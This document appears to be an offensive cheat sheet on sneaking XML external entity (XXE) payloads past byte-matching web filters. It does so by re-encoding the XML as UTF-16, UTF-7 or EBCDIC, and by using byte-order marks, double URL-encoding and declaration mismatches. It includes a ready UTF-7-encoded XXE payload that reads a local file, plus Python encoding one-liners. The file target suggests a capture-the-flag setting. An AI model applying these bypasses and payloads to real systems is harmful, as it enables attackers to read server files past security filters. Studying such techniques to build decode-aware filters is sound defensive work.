# UTF Encodings — getting XML past byte-filters

## Why encodings matter — the WAF sees bytes, the parser sees codepoints

A filter matching `DOCTYPE`/`ENTITY`/`SYSTEM`/`file:` on the raw bytes
misses the same words under a different charset. XML parsers auto-detect
encoding from the BOM and the `encoding=` declaration — and accept far
more encodings than filters expect.

## The encoding arsenal

```xml
<?xml version="1.0" encoding="UTF-16"?>      — 2-byte/char — most filters blind
<?xml version="1.0" encoding="UTF-16BE"?>    — big-endian, no BOM needed
<?xml version="1.0" encoding="UTF-16LE"?>    — little-endian
<?xml version="1.0" encoding="UTF-7"?>       — 7-bit-safe form of UTF-16 content
<?xml version="1.0" encoding="ISO-8859-1"?>  — each byte = one char
<?xml version="1.0" encoding="IBM037"?>      — EBCDIC — Java accepts it
<?xml version="1.0" encoding="windows-1252"?>
<?xml version="1.0" encoding="KOI8-R"?>
```

## UTF-16 — the strongest byte-level disguise

`DOCTYPE` in UTF-16LE is `D\0O\0C\0T\0Y\0P\0E\0` — a substring filter on
the ASCII bytes sees nothing. Convert the whole doc:

```python
open('x.xml','rb').read().decode('utf-8').encode('utf-16')   # adds BOM
# or write with utf-16-le + explicit <?xml encoding="UTF-16"?>
```

Parsers read the BOM (`FF FE`/`FE FF`) or the `encoding=` decl and
decode — entities work exactly the same after decode.

## The BOM trick — encoding without a declaration

`FF FE` = UTF-16LE, `FE FF` = UTF-16BE, `EF BB BF` = UTF-8, plus the
UTF-32 BOMs `FF FE 00 00`/`00 00 FE FF`. A BOM alone (no `encoding=`
attr) makes the parser pick UTF-16 — no ASCII "UTF-16" string for the
filter to match.

## EBCDIC — `IBM037` — Java's secret decoder

Java parsers accept `encoding="IBM037"` (EBCDIC) — the entire document
encoded in EBCDIC looks like random bytes to an ASCII filter. Convert:

```python
doc.encode('cp037')    # Python codec for IBM037
```

Java/Xerces decodes it natively. .NET/libxml2 mostly don't — Java-only
trick.

## UTF-7 — the 7-bit channel

When the transport mangles high bytes (7-bit SMTP-ish, an escaping
proxy), UTF-7 encodes `<`/`>`/`&` as `+ADw-`/`+AD4-`/`+ACY-` — pure
ASCII, no high bytes, and nothing looks like `<!ENTITY`:

```
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE r +AFs-+ADw-!ENTITY x SYSTEM +ACI-file:///flag+ACI-+AD4-+AF0-+AD4-
+ADw-r+AD4-+ACY-x+ADs-+ADw-/r+AD4-
```

## Double-encoding — encode the bytes, then wrap

If the filter decodes once (HTML-entity, URL-decode) but you deliver
two layers:

```
%253C = decodes to %3C = decodes to <
```

Apply to the whole DOCTYPE: filter sees `%253C%2521` … parser/receiver
that double-decodes rebuilds the real `<!`.

## The `encoding=` mismatch — declare one, send another

Some pipelines validate with one decoder and parse with another. Declaring
`UTF-8` but shipping UTF-16 bytes with a UTF-16 BOM — a layer that
believes the declaration while the parser believes the BOM — a second-
order split.

## iconv-sanitizer desync — PHP `iconv`/`mb_convert` pre-cleaners

An app that runs `iconv`/`mb_convert_encoding` to "normalize" input may
transform your bytes destructively — or conversely, a charset the
cleaner mishandles can smuggle entities through:

```php
iconv('UTF-8','UTF-7',$xml)     — produces the UTF-7 form server-side
```

## Falsifiers

- parser rejects the declared encoding / requires UTF-8 → byte-disguise
  dead; the signature/XML-wrapping tricks remain
- filter matches post-decode (operates on the parsed tree) → all of
  the above fail — mechanism layer change needed
